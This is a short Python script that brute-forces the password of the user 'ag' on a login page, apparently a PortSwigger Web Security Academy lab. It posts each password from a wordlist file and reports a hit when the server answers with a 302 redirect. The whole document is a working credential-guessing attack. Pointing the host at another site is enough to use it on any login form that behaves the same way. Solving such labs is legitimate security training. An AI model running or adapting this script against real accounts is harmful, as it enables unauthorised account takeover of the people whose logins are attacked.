import requests
from bs4 import BeautifulSoup

site = '0a9600ef033042ec8a126d1900e10039.web-security-academy.net'
login_url = f'https://{site}/login'
username = 'ag'

s = requests.Session()

with open("auth-lab-passwords.txt", "r") as f:
    lines = f.readlines()

for pw in lines:
    candidate = pw.strip()
    logindata = {
        'username': username,
        'password': candidate
    }

    try:
        # Set a timeout, disable redirect following
        resp = s.post(login_url, data=logindata, allow_redirects=False, timeout=10)
    except requests.exceptions.Timeout:
        print(f'[!] Timeout while trying password: {candidate}')
        continue
    except requests.exceptions.RequestException as e:
        print(f'[!] Request error: {e}')
        continue

    print(f'Trying password: {candidate} - Status Code: {resp.status_code}')

    # Valid login = redirect (302)
    if resp.status_code == 302:
        print(f'[+] Valid password for {username}: {candidate}')
        break

print('[*] Done testing all passwords.')